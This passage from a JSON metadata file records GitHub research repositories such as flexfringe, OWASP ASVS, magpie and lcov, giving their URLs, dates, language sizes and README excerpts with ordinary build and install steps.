                    "value": "flexfringe compiles without external dependencies. It currently supports build chains using make and cmake.\n\nFor expert users: In case you want to use the reduction to SAT and automatically invoke the SAT solver, you need to provide the path to the solver binary. flexfringe has been tested with lingeling (which you can get from http://fmv.jku.at/lingeling/ and run its build.sh).\n**PLEASE NOTE:** SAT solving only works for learning plain DFAs. The current implementation is not verified to be correct. Use an older commit if you rely on SAT-solving.\n\nYou can build and compile the flexfringe project by running\n\n`$ make clean all`\n\nor alternatively, using CMake\n\n`$ mkdir build && cd build && cmake ..`\n`$ make`\n\nin the main directory to build the executable named *flexfringe*. There is also a CMakelists.txt for building with cmake. We tested the toolchains on Linux (Ubuntu 16+), MacOS (10.14), and Windows 10. For the latter, be built using CMake shipped with CLion.\n",
                    "type": "Text_excerpt",
                    "original_header": "How to get set up",
                    "parent_header": [
                        "README"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/tudelft-cda-lab/FlexFringe/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This repository contains the latest release version of flexfringe.\n \n",
                    "original_header": "What this repositor contains"
                },
                "confidence": 0.9086668841565595,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/tudelft-cda-lab/FlexFringe/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-05-25T09:47:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-05T01:11:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 7841427
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 139195
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 65136
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 16470
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 15603
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 11147
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 11092
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C++",
                    "name": "Objective-C++",
                    "type": "Programming_language",
                    "size": 6690
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 6361
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Roff",
                    "name": "Roff",
                    "type": "Programming_language",
                    "size": 3012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Objective-C",
                    "name": "Objective-C",
                    "type": "Programming_language",
                    "size": 1592
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PowerShell",
                    "name": "PowerShell",
                    "type": "Programming_language",
                    "size": 1020
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Starlark",
                    "name": "Starlark",
                    "type": "Programming_language",
                    "size": 436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 120
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "598": {
        "filename": "OWASP_ASVS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/OWASP/ASVS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<img src=\"https://owasp.org/www-project-application-security-verification-standard/assets/images/OWASP_ASVS_Linkedin_Banner-01.jpg\" width=\"700px\"> \n[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/\n[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png\n[cc-by-sa-shield]: https://img.shields.io/badge/License-CC%20BY--SA%204.0-blue.svg\n \n",
                    "original_header": "OWASP Application Security Verification Standard"
                },
                "confidence": 0.9734926942571851,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OWASP/ASVS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The latest stable version is version 4.0.3 (dated October 2021), which can be found: \nThe master branch of this repository will always be the \"bleeding edge version\" which might have in-progress changes or other edits open. The next release target will be version **5.0**. \n",
                    "original_header": "Latest Stable Version - 4.0.3"
                },
                "confidence": 0.9945599899202175,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/OWASP/ASVS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-10-30T21:39:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T11:07:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 412871
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 46524
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 29491
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7566
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 6226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 4604
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "XSLT",
                    "name": "XSLT",
                    "type": "Programming_language",
                    "size": 3832
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "599": {
        "filename": "github_open-source-survey_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/github/open-source-survey",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[design]: https://github.com/github/open-source-survey/blob/master/design-principles.md \n",
                    "original_header": "The Open Source Survey"
                },
                "confidence": 0.9997189334448155,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/github/open-source-survey/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-09-07T21:57:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-17T19:09:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "600": {
        "filename": "bloa_magpie_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bloa/magpie",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "    git clone https://github.com/bloa/magpie.git\n    cd magpie\n    python3 magpie local_search --scenario examples/triangle-c/_magpie/scenario_slow.txt \n",
                    "original_header": "Try it now!"
                },
                "confidence": 0.9999999999473062,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/bloa/magpie/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-07-26T12:48:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-12T09:18:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 234385
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 611
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "601": {
        "filename": "LogIntelligence_log-analytics-chatgpt_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LogIntelligence/log-analytics-chatgpt",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-05-31T11:19:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-29T08:27:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 52685
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "602": {
        "filename": "a2i2_threshy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/a2i2/threshy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<a href=\"https://www.youtube.com/watch?v=0oOKmbG81YE\">\n    <img alt=\"Walkthrough\" src=\"https://i.imgur.com/123F9lA.png\" width=\"500\" height=\"281\">\n</a>\n<br>\n<br> \n",
                    "original_header": "Threshy"
                },
                "confidence": 0.9999150387783342,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/a2i2/threshy/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-11-22T00:01:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-10-21T02:18:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 320505
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 85556
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 34379
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 5930
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1340
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 818
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "603": {
        "filename": "JulianePa_auv_profeat_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/remaro-network/auv_profeat",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To run the model, [PRISM](https://www.prismmodelchecker.org/) and [ProFeat](https://wwwtcs.inf.tu-dresden.de/ALGI/PUB/ProFeat/doc/index.html) have to be installed. We recommend getting PRISM v4.7 and ProFeat v1.0.2.1 (commit id dfa7f03214bb92e7fd30f1402ff5a19dbdd5929c) from the respective Github repositories, the [PRISM Github repository](https://github.com/prismmodelchecker/prism/tree/v4.7) and the [ProFeat Github repository](https://github.com/pchrszon/profeat).\n\nWhen both PRISM and ProFeat are installed, make them executable from anywhere or put them in the same folder. In the latter case, the commands below have to be run from the directory which includes the executables of PRISM and ProFeat, and the file names have to include the path to these files. Below, we will assume that PRISM and ProFeat are executable from anywhere.\n",
                    "type": "Text_excerpt",
                    "original_header": "Set-up",
                    "parent_header": [
                        "Analysing Self-Adaptive Systems as Software Product Lines"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/JulianePa/auv_profeat/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-09T09:39:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-04T10:07:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "604": {
        "filename": "acmsigsoft_EmpiricalStandards_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/acmsigsoft/EmpiricalStandards",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Scholarly peer review is simultaneously \u201cthe lynchpin about which the whole business of science is pivoted\" [1] and \"prejudiced, capricious, inefficient, ineffective, and generally unscientific\u201d [2]. Many of the problems with peer review boiled down to reviewers inventing their own evaluation criteria. Devising appropriate evaluation criteria for any given manuscript is extraordinarily difficult, so most reviewers' criteria are not very good. Reviewers create criteria that are inconsistent with other reviewers', the venue's, the editor's, the methodological literature and---crucially---the author's. In effect, the real criteria by which our research is judged are not merely opaque; they don't even exist until after the manuscript is submitted. This is why peer review is so frustrating, unpredictable, and unscientific. \n\nEmpirical standards are the secret to fixing this situation. With the standards, all the reviewers use the same criteria and the authors know the criteria in advance. Used appropriately, the standards discourage reviewers from either accepting research with fatal flaws or rejecting research based on bogus criteria. \n",
                    "type": "Text_excerpt",
                    "original_header": "1. Fixing peer review",
                    "parent_header": [
                        "Empirical Standards",
                        "What are Empirical Standards for?"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/acmsigsoft/EmpiricalStandards/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please refer to the following [ReadMe File](/docs/ReadMe.md) for detailed instructions \n",
                    "original_header": "Attribute Customization and Validation"
                },
                "confidence": 0.9735173650465866,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/acmsigsoft/EmpiricalStandards/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-09-16T15:54:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T20:00:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 101177
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 20851
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 2169
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "605": {
        "filename": "ARiSE-Lab_Patch-as-translation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ARiSE-Lab/Patch-as-translation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-08-23T20:15:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-03-21T07:24:40Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 70958
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "606": {
        "filename": "jlousada315_NNE-TCP_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jlousada315/NNE-TCP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-10-19T14:16:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-08T17:14:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 55464
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "607": {
        "filename": "henry2cox_lcov_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/henry2cox/lcov",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "The LCOV package is available as either RPM or tarball from:\n\n  https://github.com/linux-test-project/lcov/releases\n\nTo install the tarball, unpack it to a directory and run:\n\n  make install\n\nUse Git for the most recent (but possibly unstable) version:\n\n  git clone https://github.com/linux-test-project/lcov.git\n\nChange to the resulting lcov directory and type:\n\n  make install\n\n",
                    "type": "Text_excerpt",
                    "original_header": "2. Installing LCOV"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/henry2cox/lcov/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  README             - This README file\n  CHANGES            - List of changes between releases\n  bin/lcov           - Tool for capturing LCOV coverage data\n  bin/genhtml        - Tool for creating HTML output from LCOV data\n  bin/gendesc        - Tool for creating description files as used by genhtml\n  bin/geninfo        - Internal tool (creates LCOV data files)\n  bin/genpng         - Internal tool (creates png overviews of source files)\n  bin/install.sh     - Internal tool (takes care of un-/installing)\n  man                - Directory containing man pages for included tools\n  example            - Directory containing an example to demonstrate LCOV\n  lcovrc             - LCOV configuration file\n  Makefile           - Makefile providing 'install' and 'uninstall' targets \n",
                    "original_header": "1. Important files"
                },
                "confidence": 0.999999972525757,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/henry2cox/lcov/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "  https://github.com/linux-test-project/lcov\n \n",
                    "original_header": "6. Questions and comments"
                },
                "confidence": 0.9997331532191335,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/henry2cox/lcov/master/README"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "-------------------------------------------------\n- README file for the LTP GCOV extension (LCOV) -\n- Last changes: 2022-10-04\n------------------------------------------------- \n"
                },
                "confidence": 0.9800278476028504,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/henry2cox/lcov/master/README"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-27T13:49:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-11T20:36:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 818143
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 61762
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 27226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 13557
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 5160
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 2730
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "608": {
        "filename": "gongbell_wana_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/gongbell/WANA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-07-26T04:13:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-29T07:19:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 304148
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "609": {
        "filename": "plead-project_EbD-artefacts_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/plead-project/EbD-artefacts",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-05-24T17:27:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-25T09:28:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "610": {
        "filename": "vul337_jTrans_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/vul337/jTrans",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-25T08:32:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-02T13:02:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 89
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "611": {
        "filename": "fastread_SLR_on_TCP_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fastread/SLR_on_TCP",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\t+ TP: 223 (ZY=yes AND Majority Vote=yes)\n\t+ TN: 476=49+427 (ZY=no AND Majority Vote=no)+(ZY=undetermined AND Majority Vote=no)\n\t+ FP: 14 (ZY=yes AND Majority Vote=no)\n\t+ FN: 70=32+38 (ZY=no AND Majority Vote=yes)+(ZY=undetermined AND Majority Vote=yes)\n\t+ Precision: 0.94\n\t+ Recall: 0.76 \n",
                    "original_header": "<a href=\"https://github.com/fastread/SLR_on_TCP/tree/master/validate\">Validation</a>"
                },
                "confidence": 0.9981955990622807,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fastread/SLR_on_TCP/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-03-20T15:06:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-14T09:41:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3053
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "612": {
        "filename": "Spirals-Team_bikiniproxy_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Spirals-Team/bikiniproxy",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "1. *HTTP/HTTPS Redirector* that changes HTTP URLs to HTTPS URLs.\n2. *HTML Element Creator* that creates missing HTML elements.\n3. *Library Injector* injects missing libraries in the page.\n4. *Line Skipper* wraps a statement with an if to prevent invalid object access.\n5. *Object Creator* initializes a variable with an empty object to prevent further null dereferences.\n \n",
                    "original_header": "Self-healing Strategies"
                },
                "confidence": 0.998762602030032,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Spirals-Team/bikiniproxy/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-03-14T14:02:17Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-14T06:56:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 2366264
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 543963
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 18976
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Gnuplot",
                    "name": "Gnuplot",
                    "type": "Programming_language",
                    "size": 1529
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "613": {
        "filename": "hendrycks_apps_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/hendrycks/apps",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-04-24T20:43:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T11:26:25Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 91745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1395
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "614": {
        "filename": "devgeniem_personaldataflow_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/devgeniem/personaldataflow",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-04-28T12:29:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-01-12T00:51:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 44632
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 7552
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 595
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "615": {
        "filename": "euro-hpc-pl_omnisolver-bruteforce_2024-10-03.json",
